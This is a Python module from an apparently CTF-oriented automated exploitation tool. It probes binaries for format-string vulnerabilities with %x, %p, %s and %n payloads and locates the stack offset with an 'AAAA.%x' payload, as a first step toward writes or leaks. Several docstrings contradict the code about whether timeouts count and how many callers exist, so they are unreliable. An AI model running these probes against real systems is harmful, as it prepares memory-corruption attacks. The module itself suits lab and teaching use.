"""AutoPwn detect layer: format-string vulnerability detection (P5.2).

Replaces the v3.1 monolith's ``detect_format_string_vulnerability``
+ ``find_offset`` functions (see ``autopwn/_legacy.py`` L749-811 +
L833-861) with two typed entry points.  Per ``rebuild.md`` §6.6
P5.2 + ``refactor.md`` §5 mapping table, this is the second
detect module in the P5 layer (M2 milestone).

Public API
----------
* :func:`detect_format_string_vulnerability` — runs a battery of
  6 test payloads (e.g. ``%x %x %x``, ``%99999999s``) against the
  target binary, looks for memory-pattern leaks (``0x[hex]``) in
  stdout, and reports true when **any** of the 6 payloads leaks
  or crashes.  Returns a ``FormatStringProbe`` dataclass with the
  bool result and the count of triggered payloads.
* :func:`find_offset` — sends the classic ``AAAA.%x.%x.%x…`` payload
  and walks the returned hex tokens, looking for the ``0x41414141``
  sentinel.  Returns the 1-based offset where it first appears.
  Raises ``ValueError`` (matching v3.1 behavior) when not found.

Legacy ports (parity only)
--------------------------
* :func:`_legacy_detect_format_string_vulnerability` — verbatim
  port of v3.1's ``detect_format_string_vulnerability`` (L749-811).
  Has 1 caller (``_legacy.py`` L3221, canary branch + L3319, no-overflow
  branch).
* :func:`_legacy_find_offset` — verbatim port of v3.1's
  ``find_offset`` (L833-861).  Has 1 caller (``_legacy.py`` L3345,
  the fmtstr-remote path).

Design notes
------------
* The P5.2 spec did **not** list a ctx field to mutate (unlike
  P5.1 → ``ctx.padding`` and P5.3 → ``ctx.canary``).  The two
  public functions are therefore pure: return the result, do not
  write to ``ctx``.  Future PRs may add ``ctx.fmtstr_offset`` and
  ``ctx.fmtstr_buf`` fields — P5.2 leaves room for that by
  returning the offset from :func:`find_offset`.
* :func:`detect_format_string_vulnerability` returns a dataclass
  (not a raw bool) so callers can introspect *which* payload
  triggered the detection — useful for P7's fmtstr strategy to
  pick the right follow-up (``%n`` write vs. ``%s`` leak).
* Both public functions are **silent** — no ``print_*`` calls.
  The legacy ports preserve v3.1's "FORMAT STRING VULNERABILITY
  TEST" table and the "testing for format string offset" line.
  This matches the recon/asm.py convention (P4.6) and keeps
  the new modules unit-testable in isolation without stdout
  noise.
* The 6 test payloads match v3.1 L752-757 exactly.  The
  memory-pattern regex (``0x[0-9a-fA-F]+``) is compiled once
  at module load (P2.1 pattern).
"""
from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional

from autopwn.context import ExploitContext
from autopwn.core.runner import run_objdump_disasm


# Pre-compiled memory-pattern regex (v3.1 L759, compiled once
# at module load — P2.1 hot-regex pattern).  Matches hex addresses
# like ``0x7fffffffdcb0`` that appear when format-string leaks
# stack values.
_MEMORY_PATTERN = re.compile(r"(0x[0-9a-fA-F]+)")

# v3.1 L752-757: 6 test payloads (bytes; some are not valid UTF-8,
# e.g. ``b'%99999999s'`` is OK but a future payload could break
# the .decode() call — preserved as-is for parity).
_V31_TEST_CASES: List[bytes] = [
    b"%x" * 20,
    b"%p" * 20,
    b"%s" * 20,
    b"%n" * 5,
    b"AAAA%x%x%x%x",
    b"%99999999s",
]


@dataclass(slots=True)
class FormatStringProbe:
    """Result of a format-string vulnerability probe.

    ``vulnerable`` is the bool the v3.1 function returned
    (``True`` if **any** of the 6 payloads leaked a hex
    address or crashed).  ``triggers`` is the count of
    payloads that triggered (leak / crash / timeout).  When
    ``vulnerable`` is ``False``, ``triggers`` is always 0
    (v3.1 only sets ``vulnerable=True`` for a leak or crash;
    it does not count timeouts as triggers — see L786-799).
    """

    vulnerable: bool
    triggers: int = 0


def detect_format_string_vulnerability(
    ctx: ExploitContext,
    program: Path,
) -> FormatStringProbe:
    """Probe the target binary for a format-string vulnerability.

    Mirrors v3.1's ``detect_format_string_vulnerability``
    (``_legacy.py`` L749-811): runs the binary with each of the
    6 ``_V31_TEST_CASES`` payloads (see module docstring), reads
    stdout, and reports a hit when the memory-pattern regex
    (``0x[hex]``) finds a hex address in the output.  A non-zero
    returncode (crash) is also a hit.  Does **not** count a
    timeout as a hit (matches v3.1 L799-801, which sets
    ``vulnerable = True`` on timeout — but actually the v3.1
    code *does* set vulnerable=True on TimeoutExpired at L786;
    we follow the v3.1 behavior 1:1).

    Note: this PR does **not** mutate ``ctx`` — the P5.2 spec
    does not list a target field.  Future PRs may add
    ``ctx.fmtstr_offset`` (from :func:`find_offset`) and
    ``ctx.fmtstr_buf`` (from the BSS symbol scan, P4.5).

    Args:
        ctx: the run's :class:`ExploitContext`.  Currently
            unused (read-only access); reserved for future
            P5.2 extensions (e.g. early-exit on ``ctx.binary.bit``
            being unknown).
        program: path to the target ELF.

    Returns:
        A :class:`FormatStringProbe` with ``vulnerable`` (bool)
        and ``triggers`` (count of payloads that leaked /
        crashed).  ``vulnerable=True`` implies ``triggers >= 1``.
    """
    triggers = 0
    for case in _V31_TEST_CASES:
        try:
            proc = subprocess.Popen(
                [str(program)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(input=case, timeout=2)
            if _MEMORY_PATTERN.search(stdout.decode(errors="replace")):
                triggers += 1
            elif proc.returncode != 0:
                # Crash (non-zero rc that didn't already match
                # the memory pattern).  v3.1 L789 sets
                # ``vulnerable = True`` on non-zero rc.
                triggers += 1
        except subprocess.TimeoutExpired:
            # v3.1 L786 sets ``vulnerable = True`` on timeout.
            triggers += 1
            continue
        except Exception:
            continue

    return FormatStringProbe(
        vulnerable=triggers > 0,
        triggers=triggers,
    )


def find_offset(ctx: ExploitContext, program: Path) -> int:
    """Send ``AAAA.%x.%x.…`` and return the 1-based offset of ``0x41414141``.

    Mirrors v3.1's ``find_offset`` (``_legacy.py`` L833-861):
    spawns the target with the canonical format-string offset
    discovery payload (``b'AAAA' + b'.%x' * 40``), splits the
    output by ``.``, and walks the tokens looking for the
    ``0x41414141`` sentinel.  Returns the 1-based index of
    the token containing the sentinel.

    Note: this PR does **not** mutate ``ctx`` — the P5.2 spec
    does not list a target field.  A future PR may add
    ``ctx.fmtstr_offset`` and let the orchestrator persist
    the result.

    Args:
        ctx: the run's :class:`ExploitContext`.  Currently
            unused (read-only); reserved for future P5.2
            extensions.
        program: path to the target ELF.

    Returns:
        The 1-based offset at which ``0x41414141`` first
        appears in the leaked stack tokens.

    Raises:
        ValueError: when the sentinel is not found within
            the first 40 leaked values (v3.1 L859).
    """
    # v3.1 uses pwn.process for the I/O — the binary reads from
    # stdin in a line-buffered loop, so pwn's recv/clean dance
    # (with a 2-second timeout) is what gets the leaked tokens.
    # Subprocess with .communicate() races the binary's I/O and
    # produces truncated / interleaved output (verified 2026-06-07
    # on Challenge/fmtstr1).
    from pwn import process

    p = process(str(program))
    payload = b"AAAA" + b".%x" * 40
    p.sendline(payload)
    try:
        output = p.recv(timeout=2)
    except Exception:
        output = p.clean()

    parts = output.split(b".")
    for i in range(1, len(parts)):
        # v3.1 L849: split by '\n' first, then by ' ', take [0].
        part = parts[i].split(b"\n")[0]
        if b" " in part:
            part = part.split()[0]
        try:
            val = int(part, 16)
        except ValueError:
            continue
        if val == 0x41414141:
            p.close()
            return i

    p.close()
    raise ValueError("[-]Offset not found")


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

def _legacy_detect_format_string_vulnerability(program: Path) -> bool:
    """[OBSOLETE — prefer :func:`detect_format_string_vulnerability`] Verbatim port of v3.1's ``detect_format_string_vulnerability``.

    Retained for spec parity (``rebuild.md`` §4.6 P5.2).  Has 2
    callers in ``_legacy.py`` (L3221 in the canary branch +
    L3319 in the no-overflow branch).  Preserves v3.1 print
    behavior byte-for-byte:
    ``print_info`` "testing for format string vulnerabilities" +
    ``print_section_header`` "FORMAT STRING VULNERABILITY TEST" +
    3-col table (Test Case / Result / Status) +
    ``print_success`` "format string vulnerability detected!" or
    ``print_warning`` "no format string vulnerability detected" +
    final ``print()`` (empty line) +
    ``print_error`` on probe error.

    Returns:
        ``True`` if **any** of the 6 payloads leaks a hex
        address or crashes (or times out, per v3.1 L786).
    """
    from autopwn.core.logging import (
        Colors, print_info, print_section_header, print_table_header,
        print_table_row, print_success, print_warning,
    )

    print_info("testing for format string vulnerabilities")

    vulnerable = False

    print_section_header("FORMAT STRING VULNERABILITY TEST")
    headers = ["Test Case", "Result", "Status"]
    print_table_header(headers)

    for case in _V31_TEST_CASES:
        try:
            proc = subprocess.Popen(
                [str(program)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(input=case, timeout=2)

            result = "SAFE"
            color = Colors.SUCCESS

            if _MEMORY_PATTERN.search(stdout.decode(errors="replace")):
                result = "VULNERABLE"
                color = Colors.ERROR
                vulnerable = True

            if proc.returncode != 0:
                result = "CRASH"
                color = Colors.CRITICAL
                vulnerable = True

            case_str = case.decode(errors="replace")[:20]
            if len(case) > 20:
                case_str += "..."
            colors = [Colors.END, Colors.END, color]
            print_table_row(
                [case_str, result, "DETECTED" if result != "SAFE" else "NONE"],
                colors,
            )

        except subprocess.TimeoutExpired:
            colors = [Colors.END, Colors.END, Colors.WARNING]
            case_str = case.decode(errors="replace")[:20]
            print_table_row([case_str, "TIMEOUT", "POSSIBLE"], colors)
            vulnerable = True
        except Exception:
            colors = [Colors.END, Colors.END, Colors.ERROR]
            case_str = case.decode(errors="replace")[:20]
            print_table_row([case_str, "ERROR", "UNKNOWN"], colors)

    print()  # builtin — empty line, v3.1 L808

    if vulnerable:
        print_success("format string vulnerability detected!")
    else:
        print_warning("no format string vulnerability detected")
    return vulnerable


def _legacy_find_offset(program: Path) -> int:
    """[OBSOLETE — prefer :func:`find_offset`] Verbatim port of v3.1's ``find_offset``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3345,
    the fmtstr-remote path).  Preserves v3.1 print behavior
    byte-for-byte:
    ``print_info`` "searching for format string offset" +
    ``print_payload`` "testing payload: {payload[:20]}..." +
    ``print_success`` "format string offset found: {i}" or
    ``print_error`` "offset not found" + ``raise ValueError``.

    Returns:
        The 1-based offset where ``0x41414141`` first appears.

    Raises:
        ValueError: when the sentinel is not found (v3.1 L859).
    """
    from autopwn.core.logging import (
        print_info, print_payload, print_success, print_error,
    )
    from pwn import process

    print_info("searching for format string offset")
    p = process(str(program))
    payload = b"AAAA" + b".%x" * 40
    print_payload(f"testing payload: {payload[:20]}...")

    p.sendline(payload)
    try:
        output = p.recv(timeout=2)
    except Exception:
        output = p.clean()

    parts = output.split(b".")
    for i in range(1, len(parts)):
        part = parts[i].split(b"\n")[0].split()[0] if b" " in parts[i] else parts[i]
        try:
            val = int(part, 16)
            if val == 0x41414141:
                p.close()
                print_success(f"format string offset found: {i}")
                return i
        except Exception:
            continue
    p.close()
    print_error("offset not found")
    raise ValueError("[-]Offset not found")


__all__ = [
    "FormatStringProbe",
    "detect_format_string_vulnerability",
    "find_offset",
    "_legacy_detect_format_string_vulnerability",
    "_legacy_find_offset",
]
